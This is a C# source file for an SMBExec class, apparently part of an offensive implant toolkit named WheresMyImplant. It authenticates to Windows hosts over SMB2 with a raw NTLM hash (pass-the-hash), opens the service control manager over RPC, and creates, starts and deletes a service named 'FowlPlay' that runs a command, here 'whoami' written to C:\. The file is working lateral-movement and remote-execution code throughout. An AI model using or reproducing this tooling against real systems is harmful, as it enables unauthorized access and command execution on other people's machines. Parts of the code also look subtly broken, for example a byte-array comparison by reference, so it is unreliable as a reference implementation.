using System;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;


namespace WheresMyImplant
{
    class SMBExec : SMB
    {
        Byte[] flags;
        UInt32 messageId = 0x1;
        Byte[] treeId = { 0x00, 0x00, 0x00, 0x00 };
        Byte[] sessionId = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

        Byte[] sessionKeyLength = { 0x00, 0x00 };
        Boolean signing = false;
        Byte[] sessionKey;

        String version;//= "SMB2";
        String system;

        Byte[] processId;
        TcpClient smbClient;
        NetworkStream streamSocket;

        Byte[] guidFileHandle = new Byte[16];
        Byte[] serviceHandle = new Byte[0];

        Byte[] recieve = new Byte[81920];

        Byte[] serviceName;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal SMBExec()
        {
            smbClient = new TcpClient();
            Int32 dwProcessId = Process.GetCurrentProcess().Id;
            String strProcessId = BitConverter.ToString(BitConverter.GetBytes(dwProcessId));
            processId = strProcessId.Split('-').Select(i => (Byte)Convert.ToInt16(i, 16)).ToArray();

            serviceName = Encoding.ASCII.GetBytes("FowlPlay");

            if (0 == serviceName.Length % 2)
            {
                serviceName = Misc.Combine(serviceName, new Byte[] { 0x00, 0x00 });
            }
            else
            {
                serviceName = Misc.Combine(serviceName, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void NegotiateSMB()
        {
            SMBHeader smbHeader = new SMBHeader();
            smbHeader.SetCommand(new Byte[] { 0x72 });
            smbHeader.SetFlags(new Byte[] { 0x18 });
            smbHeader.SetFlags2(new Byte[] { 0x01, 0x48 });
            smbHeader.SetProcessID(processId.Take(2).ToArray());
            smbHeader.SetUserID(new Byte[] { 0x00, 0x00 });
            Byte[] bHeader = smbHeader.GetHeader();

            SMBNegotiateProtocolRequest protocols = new SMBNegotiateProtocolRequest();
            Byte[] bData = protocols.GetProtocols();

            NetBIOSSessionService sessionService = new NetBIOSSessionService();
            sessionService.SetHeaderLength(bHeader.Length);
            sessionService.SetDataLength(bData.Length);
            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();

            Byte[] send = Misc.Combine(bSessionService, bHeader);
            send = Misc.Combine(send, bData);
            streamSocket.Write(send, 0, send.Length);
            streamSocket.Flush();
            Byte[] recieve = new Byte[81920];
            streamSocket.Read(recieve, 0, recieve.Length);

            Byte[] response = recieve.Skip(5).Take(4).ToArray();
            if (response == new Byte[] { 0xff, 0x53, 0x4d, 0x42 })
            {
                WriteOutput("[-] SMB1 is not supported");
                return;
            }

            version = "SMB2";

            Byte[] keyLength = { 0x00, 0x00 };

            if (recieve.Skip(70).Take(1).ToArray().SequenceEqual(new Byte[] { 0x03 }))
            {
                WriteOutputNeutral("SMB Signing Required");
                signing = true;
                flags = new Byte[] { 0x15, 0x82, 0x08, 0xa0 };
            }
            else
            {
                signing = false;
                flags = new Byte[] { 0x05, 0x80, 0x08, 0xa0 };
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void NegotiateSMB2()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x00, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x00, 0x00 });
            header.SetMessageID(messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);
            Byte[] bHeader = header.GetHeader();

            SMB2NegotiateProtocolRequest protocols = new SMB2NegotiateProtocolRequest();
            Byte[] bData = protocols.GetProtocols();

            NetBIOSSessionService sessionService = new NetBIOSSessionService();
            sessionService.SetHeaderLength(bHeader.Length);
            sessionService.SetDataLength(bData.Length);
            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();

            Byte[] send = Misc.Combine(bSessionService, bHeader);
            send = Misc.Combine(send, bData);
            streamSocket.Write(send, 0, send.Length);
            streamSocket.Flush();
            streamSocket.Read(recieve, 0, recieve.Length);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void NTLMSSPNegotiate()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x01, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x1f, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);
            Byte[] bHeader = header.GetHeader();

            SMB2NTLMSSPNegotiate NTLMSSPNegotiate = new SMB2NTLMSSPNegotiate(version);
            NTLMSSPNegotiate.SetFlags(flags);
            Byte[] bNegotiate = NTLMSSPNegotiate.GetSMB2NTLMSSPNegotiate();

            SMB2SessionSetupRequest sessionSetup = new SMB2SessionSetupRequest();
            sessionSetup.SetSecurityBlob(bNegotiate);
            Byte[] bData = sessionSetup.GetSMB2SessionSetupRequest();

            NetBIOSSessionService sessionService = new NetBIOSSessionService();
            sessionService.SetHeaderLength(bHeader.Length);
            sessionService.SetDataLength(bData.Length);
            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();

            Byte[] send = Misc.Combine(bSessionService, bHeader);
            send = Misc.Combine(send, bData);
            streamSocket.Write(send, 0, send.Length);
            streamSocket.Flush();
            streamSocket.Read(recieve, 0, recieve.Length);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean Authenticate(String domain, String username, String hash)
        {
            String NTLMSSP = BitConverter.ToString(recieve).Replace("-", "");
            Int32 index = NTLMSSP.IndexOf("4E544C4D53535000") / 2;

            UInt16 wDomain = BitConverter.ToUInt16(recieve.Skip(index + 12).Take(2).ToArray(), 0);
            UInt16 wtarget = BitConverter.ToUInt16(recieve.Skip(index + 40).Take(2).ToArray(), 0);

            sessionId = recieve.Skip(44).Take(8).ToArray();
            Byte[] bServerChallenge = recieve.Skip(index + 24).Take(8).ToArray();
            Int32 start = index + 56 + wDomain;
            Int32 end = index + 55 + wDomain + wtarget;
            Byte[] details = recieve.Skip(start).Take(end - start + 1).ToArray();
            Byte[] bTime = details.Skip(details.Length - 12).Take(8).ToArray();

            Int32 j = 0;
            Byte[] bHash = new Byte[hash.Length / 2];
            for (Int32 i = 0; i < hash.Length; i += 2)
            {
                bHash[j++] = (Byte)((Char)Convert.ToInt16(hash.Substring(i, 2), 16));
            }

            Byte[] bHostname = Encoding.Unicode.GetBytes(Environment.MachineName);
            Byte[] hostnameLength = BitConverter.GetBytes(bHostname.Length).Take(2).ToArray();

            Byte[] bDomain = Encoding.Unicode.GetBytes(domain);
            Byte[] domainLength = BitConverter.GetBytes(bDomain.Length).Take(2).ToArray();

            Byte[] bUsername = Encoding.Unicode.GetBytes(username);
            Byte[] usernameLength = BitConverter.GetBytes(bUsername.Length).Take(2).ToArray();

            Byte[] domainOffset = { 0x40, 0x00, 0x00, 0x00 };
            Byte[] usernameOffset = BitConverter.GetBytes(bDomain.Length + 64);
            Byte[] hostnameOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + 64);
            Byte[] lmOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bHostname.Length + 64);
            Byte[] ntOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bHostname.Length + 88);

            String usernameTarget = username.ToUpper();
            Byte[] bUsernameTarget = Encoding.Unicode.GetBytes(usernameTarget);
            bUsernameTarget = Misc.Combine(bUsernameTarget, bDomain);

            Byte[] NetNTLMv2Hash;
            using (HMACMD5 hmac = new HMACMD5())
            {
                hmac.Key = bHash;
                NetNTLMv2Hash = hmac.ComputeHash(bUsernameTarget);
            }

            Byte[] bClientChallenge = new Byte[8];
            Random random = new Random();
            for (Int32 i = 0; i < 8; i++)
            {
                bClientChallenge[i] = (Byte)random.Next(0, 255);
            }

            Byte[] blob = Misc.Combine(new Byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, bTime);
            blob = Misc.Combine(blob, bClientChallenge);
            blob = Misc.Combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
            blob = Misc.Combine(blob, details);
            blob = Misc.Combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            Byte[] bServerChallengeAndBlob = Misc.Combine(bServerChallenge, blob);
            Byte[] NetNTLMv2Response;
            using (HMACMD5 hmacMD5 = new HMACMD5())
            {
                hmacMD5.Key = NetNTLMv2Hash;
                NetNTLMv2Response = hmacMD5.ComputeHash(bServerChallengeAndBlob);
            }

            if (signing)
            {
                using (HMACMD5 hmacMD5 = new HMACMD5())
                {
                    hmacMD5.Key = NetNTLMv2Hash;
                    sessionKey = hmacMD5.ComputeHash(NetNTLMv2Response);
                }
            }

            NetNTLMv2Response = Misc.Combine(NetNTLMv2Response, blob);
            Byte[] NetNTLMv2ResponseLength = BitConverter.GetBytes(NetNTLMv2Response.Length).Take(2).ToArray();

            Byte[] sessionKeyOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bHostname.Length + NetNTLMv2Response.Length + 88);

            Byte[] NetNTLMSSPResponse = { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00 };
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, new Byte[] { 0x18, 0x00 });
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, new Byte[] { 0x18, 0x00 });
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, lmOffset);

            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, NetNTLMv2ResponseLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, NetNTLMv2ResponseLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, ntOffset);

            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, domainLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, domainLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, domainOffset);

            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, usernameLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, usernameLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, usernameOffset);

            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, hostnameLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, hostnameLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, hostnameOffset);

            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, sessionKeyLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, sessionKeyLength);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, sessionKeyOffset);

            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, flags);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, bDomain);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, bUsername);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, bHostname);
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            NetNTLMSSPResponse = Misc.Combine(NetNTLMSSPResponse, NetNTLMv2Response);

            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x01, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x1f, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);
            Byte[] bHeader = header.GetHeader();

            NTLMSSPAuth ntlmSSPAuth = new NTLMSSPAuth();
            ntlmSSPAuth.SetNetNTLMResponse(NetNTLMSSPResponse);
            Byte[] bNTLMSSPAuth = ntlmSSPAuth.GetNTLMSSPAuth();

            SMB2SessionSetupRequest sessionSetup = new SMB2SessionSetupRequest();
            sessionSetup.SetSecurityBlob(bNTLMSSPAuth);
            Byte[] bData = sessionSetup.GetSMB2SessionSetupRequest();

            NetBIOSSessionService sessionService = new NetBIOSSessionService();
            sessionService.SetHeaderLength(bHeader.Length);
            sessionService.SetDataLength(bData.Length);
            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();

            Byte[] send = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
            streamSocket.Write(send, 0, send.Length);
            streamSocket.Flush();
            streamSocket.Read(recieve, 0, recieve.Length);

            Byte[] status = recieve.Skip(12).Take(4).ToArray();
            if (status.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00 }))
            {
                WriteOutputGood(String.Format("{0} Login Successful to {1}", username, system));
                return true;
            }
            
            WriteOutput(String.Format("[-] {0} Login Failed to {1}", username, system));
            WriteOutput(String.Format("[-] Status: {0}", BitConverter.ToString(status)));
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean TreeConnect(String share)
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x03, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SMB2TreeConnectRequest treeConnect = new SMB2TreeConnectRequest();
            treeConnect.SetPath(share);
            Byte[] bData = treeConnect.GetRequest();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        internal Boolean CreateRequest()
        {
            treeId = recieve.Skip(40).Take(4).ToArray();

            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x05, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SMB2CreateRequest createRequest = new SMB2CreateRequest();
            createRequest.SetFileName("svcctl");
            createRequest.SetShareAccess(new Byte[] { 0x07, 0x00, 0x00, 0x00 });
            Byte[] bData = createRequest.GetRequest();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            guidFileHandle = recieve.Skip(0x0084).Take(16).ToArray();
            return Send(bHeader, bData);
        }

        internal Boolean RPCBind()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x09, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            DCERPCBind bind = new DCERPCBind();
            bind.SetFragLength(new Byte[] { 0x48, 0x00 });
            bind.SetCallID(1);
            bind.SetNumCtxItems(new Byte[] { 0x01 });
            bind.SetInterface(new Byte[] { 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03 });
            bind.SetInterfaceVer(new Byte[] { 0x02, 0x00 });
            Byte[] bData = bind.GetRequest();

            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
            writeRequest.SetGuidHandleFile(guidFileHandle);
            writeRequest.SetLength(bData.Length);
            bData = Misc.Combine(writeRequest.GetRequest(), bData);

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        internal Boolean ReadRequest()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x08, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SMB2ReadRequest readRequest = new SMB2ReadRequest();
            readRequest.SetGuidHandleFile(guidFileHandle);
            readRequest.SetLength(new Byte[] { 0xff, 0x00, 0x00, 0x00 });
            Byte[] bData = readRequest.GetRequest();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        internal Boolean OpenSCManagerW()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x09, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SVCCTLSCMOpenSCManagerW openSCManagerW = new SVCCTLSCMOpenSCManagerW();
            Byte[] bSCManager = openSCManagerW.GetRequest();

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(bSCManager.Length, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x0f, 0x00 });
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
            writeRequest.SetGuidHandleFile(guidFileHandle);
            writeRequest.SetLength(bRPCRequest.Length + bSCManager.Length);
            Byte[] bWriteRequest = writeRequest.GetRequest();

            Byte[] bData = Misc.Combine(bWriteRequest, bRPCRequest);
            bData = Misc.Combine(bData, bSCManager);

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            NetBIOSSessionService sessionService = new NetBIOSSessionService();
            sessionService.SetHeaderLength(bHeader.Length);
            sessionService.SetDataLength(bData.Length);
            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();

            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
            streamSocket.Write(bSend, 0, bSend.Length);
            streamSocket.Flush();
            streamSocket.Read(recieve, 0, recieve.Length);

            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
                return true;
            else
                return false;
        }

        internal Boolean CheckAccess()
        {
            Byte[] handle = recieve.Skip(107).Take(19).ToArray();
            Byte[] status = recieve.Skip(127).Take(4).ToArray();

            if (!status.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00 }) 
                && handle.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
            {
                return false;
            }

            SVCCTLSCMCreateServiceW createServiceW = new SVCCTLSCMCreateServiceW();
            createServiceW.SetContextHandle(handle);
            createServiceW.SetServiceName();
            createServiceW.SetCommand(@"%COMSPEC% /c whoami > C:\whoami.txt");
            Byte[] bData = createServiceW.GetRequest();

            if (bData.Length < 4256)
                return CreateServiceW(bData);
            else
                return CreateServiceW1();
        }

        internal Boolean CreateServiceW(Byte[] bCreateServiceW)
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x09, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(bCreateServiceW.Length, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x0c, 0x00 });
            Byte[] bRPCData = rpcRequest.GetRequest();

            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
            writeRequest.SetGuidHandleFile(guidFileHandle);
            writeRequest.SetLength(bRPCData.Length + bCreateServiceW.Length);
            Byte[] bWriteRequest = writeRequest.GetRequest();

            Combine combine = new Combine();
            combine.Extend(bWriteRequest);
            combine.Extend(bCreateServiceW);
            combine.Extend(bRPCData);
            Byte[] bData = combine.Retrieve();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        internal Boolean CreateServiceW1()
        {
            return false;
        }

        internal Boolean StartServiceW()
        {
            serviceHandle = recieve.Skip(112).Take(19).ToArray();

            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x09, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SVCCTLSCMStartServiceW startServiceW = new SVCCTLSCMStartServiceW();
            startServiceW.SetContextHandle(serviceHandle);
            Byte[] bStartService = startServiceW.GetRequest();

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(bStartService.Length, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x13, 0x00 });
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
            writeRequest.SetGuidHandleFile(guidFileHandle);
            writeRequest.SetLength(bRPCRequest.Length + bStartService.Length);
            Byte[] bWriteRequest = writeRequest.GetRequest();

            Combine combine = new Combine();
            combine.Extend(bWriteRequest);
            combine.Extend(bRPCRequest);
            combine.Extend(bStartService);
            Byte[] bData = combine.Retrieve();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        internal Boolean DeleteServiceW()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x09, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SVCCTLSCMDeleteServiceW deleteServiceW = new SVCCTLSCMDeleteServiceW();
            deleteServiceW.SetContextHandle(serviceHandle);
            Byte[] bDeleteServiceW = deleteServiceW.GetRequest();

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(bDeleteServiceW.Length, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x02, 0x00 });
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
            writeRequest.SetGuidHandleFile(guidFileHandle);
            writeRequest.SetLength(bRPCRequest.Length + bDeleteServiceW.Length);
            Byte[] bWriteRequest = writeRequest.GetRequest();

            Combine combine = new Combine();
            combine.Extend(bWriteRequest);
            combine.Extend(bRPCRequest);
            combine.Extend(bDeleteServiceW);
            Byte[] bData = combine.Retrieve();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        internal Boolean CloseServiceHandle()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x09, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SVCCTLSCMCloseServiceHandle closeServiceW = new SVCCTLSCMCloseServiceHandle();
            closeServiceW.SetContextHandle(serviceHandle);
            Byte[] bCloseServiceW = closeServiceW.GetRequest();

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(bCloseServiceW.Length, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x00, 0x00 });
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
            writeRequest.SetGuidHandleFile(guidFileHandle);
            writeRequest.SetLength(bRPCRequest.Length + bCloseServiceW.Length);
            Byte[] bWriteRequest = writeRequest.GetRequest();

            Combine combine = new Combine();
            combine.Extend(bWriteRequest);
            combine.Extend(bRPCRequest);
            combine.Extend(bCloseServiceW);
            Byte[] bData = combine.Retrieve();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean CloseRequest()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x06, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SMB2CloseRequest closeRequest = new SMB2CloseRequest();
            closeRequest.SetFileID(guidFileHandle);
            Byte[] bData = closeRequest.GetRequest();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            else
            {
                header.SetFlags(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean DisconnectTree()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x04, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SMB2TreeDisconnectRequest disconnectRequest = new SMB2TreeDisconnectRequest();
            Byte[] bData = disconnectRequest.GetRequest();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }
            else
            {
                header.SetFlags(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
            }
            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean Logoff()
        {
            SMB2Header header = new SMB2Header();
            header.SetCommand(new Byte[] { 0x02, 0x00 });
            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
            header.SetMessageID(++messageId);
            header.SetProcessID(processId);
            header.SetTreeId(treeId);
            header.SetSessionID(sessionId);

            SMB2SessionLogoffRequest logoffRequest = new SMB2SessionLogoffRequest();
            Byte[] bData = logoffRequest.GetRequest();

            if (signing)
            {
                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                header.SetSignature(sessionKey, ref bData);
            }

            Byte[] bHeader = header.GetHeader();

            return Send(bHeader, bData);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private Boolean Send(Byte[] bHeader, Byte[] bData)
        {
            NetBIOSSessionService sessionService = new NetBIOSSessionService();
            sessionService.SetHeaderLength(bHeader.Length);
            sessionService.SetDataLength(bData.Length);
            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();

            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
            streamSocket.Write(bSend, 0, bSend.Length);
            streamSocket.Flush();
            streamSocket.Read(recieve, 0, recieve.Length);

            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
                return true;
            else
                return false;
        }
    }
}
